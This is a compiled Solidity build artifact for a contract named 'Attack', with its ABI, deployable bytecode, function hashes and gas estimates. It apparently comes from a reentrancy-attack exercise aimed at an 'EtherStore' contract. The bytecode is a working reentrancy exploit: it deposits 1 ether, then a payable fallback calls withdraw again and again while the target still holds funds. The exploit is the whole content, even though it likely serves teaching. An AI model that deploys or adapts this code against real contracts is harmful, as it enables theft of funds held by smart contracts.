{
    "contractName": "Attack",
    "abi": [
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "_etherStoreAddress",
                    "type": "address"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "stateMutability": "payable",
            "type": "fallback"
        },
        {
            "inputs": [],
            "name": "attack",
            "outputs": [],
            "stateMutability": "payable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "etherstore",
            "outputs": [
                {
                    "internalType": "contract EtherStore",
                    "name": "",
                    "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "getBalance",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        }
    ],
    "bytecode": "608060405234801561001057600080fd5b506040516102b13803806102b183398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b61021e806100936000396000f3fe6080604052600436106100345760003560e01c806312065fe0146100ad57806379c30d2f146100cd5780639e5faafc14610105575b600054670de0b6b3a76400006001600160a01b0390911631106100ab576000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561009257600080fd5b505af11580156100a6573d6000803e3d6000fd5b505050505b005b3480156100b957600080fd5b506040514781526020015b60405180910390f35b3480156100d957600080fd5b506000546100ed906001600160a01b031681565b6040516001600160a01b0390911681526020016100c4565b6100ab670de0b6b3a764000034101561011d57600080fd5b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561017357600080fd5b505af1158015610187573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156101ce57600080fd5b505af11580156101e2573d6000803e3d6000fd5b5050505056fea2646970667358221220acbb59c1b97968bd35d1862de9d3677068952e960d2aa060d324e7d44356dfab64736f6c634300080c0033",
    "sourcePath": "/home/dukhovny/Solidity/Re-Entrancy Attack/contracts/Attack.sol",
    "compiler": {
        "name": "solc",
        "version": "0.8.12+commit.f00d7308"
    },
    "functionHashes": {
        "attack()": "9e5faafc",
        "etherstore()": "79c30d2f",
        "getBalance()": "12065fe0"
    },
    "gasEstimates": {
        "creation": {
            "codeDepositCost": "108400",
            "executionCost": "infinite",
            "totalCost": "infinite"
        },
        "external": {
            "": "infinite",
            "attack()": "infinite",
            "etherstore()": "2337",
            "getBalance()": "146"
        }
    }
}